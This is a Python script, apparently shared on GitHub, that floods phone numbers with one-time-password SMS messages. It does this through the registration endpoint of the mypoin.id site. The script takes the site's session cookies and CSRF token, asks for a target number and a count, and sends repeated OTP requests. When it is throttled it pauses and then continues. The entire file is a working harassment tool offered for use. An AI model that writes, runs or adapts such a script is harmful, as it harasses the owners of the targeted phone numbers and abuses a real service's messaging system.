# Author : Ridho Gaming
# Github : github.com/ridhoNoob
# Script : Spam otp mypoin

import re,sys,time,json,os

try:
	from bs4 import BeautifulSoup as sup
except ImportError:
	os.system('pip install bs4')
try:
	import requests
except ImportError:
	os.system('pip install requests')


c = requests.Session()

def get_cookies():
	global cfduid,token
	r = c.get('https://mypoin.id/register/validate-phone-number')
	kue = r.headers['Set-Cookie']
	cfduid = re.findall("__cfduid=.*?;",str(kue))[0].replace(';','')
	csrf = re.findall("csrftoken=.*?;",str(kue))[0].replace(';','')
	return [cfduid,csrf]

def get_token():
	r = c.get('https://mypoin.id/register/validate-phone-number')
	d = sup(r.content,'html.parser')
	he =  d.find_all("form")
	tes = re.findall('value="(.*?)"/>',str(he[0]))[0].replace('""','')
	return tes

class spam:
	def __init__(self):
		cok = get_cookies()
		self.head = {
			"Host":"mypoin.id",
			"Connection":"keep-alive",
			"Origin":"https://mypoin.id",
			"X-Requested-With":"XMLHttpRequest",
			"Save-Data":"on",
			"User-Agent":"Mozilla/5.0",
			"Sec-Fetch-Site":"same-origin",
			"Sec-Fetch-Mode":"cors",
			"Referer":"https://mypoin.id/register/validate-phone-number",
			"Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6",
			"Cookie":"__cfduid="+str(cok[0].replace("__cfduid=",""))+"; csrftoken="+str(cok[1].replace("csrftoken=",""))+"; _ga=GA1.2.138906189.1579843059; _gid=GA1.2.761915441.1579843059"
			}
		self.no_hp()
	def no_hp(self):
		self.no = input("\033[96m[+]\033[0m No hp : ")
		if self.no == "":
			self.no_hp()
		else:
			self.jumlah()
	def jumlah(self):
		self.jlm = input("\033[96m[+]\033[0m Jumlah : ")
		if self.jlm == "":
			self.jumlah()
		else:
			self.mulai()
	def mulai(self):
		print()
		for i in range(1,int(self.jlm)+1):
			r = requests.post("https://mypoin.id/register/request-otp",headers=self.head,data=
			{
				'phone':self.no,
				'csrfmiddlewaretoken':get_token()
			})
			js = json.loads(r.text)
			if "status" in js.keys():
				print (f"[\033[92m{i}\033[0m] sukses terkirim ke  \033[95m{self.no}\033[0m")
				time.sleep(1)
			else:
				print ("[*] Delay \033[94m1 \033[0mmenit \033[91m........\033[0m")
				time.sleep(60)
spam()
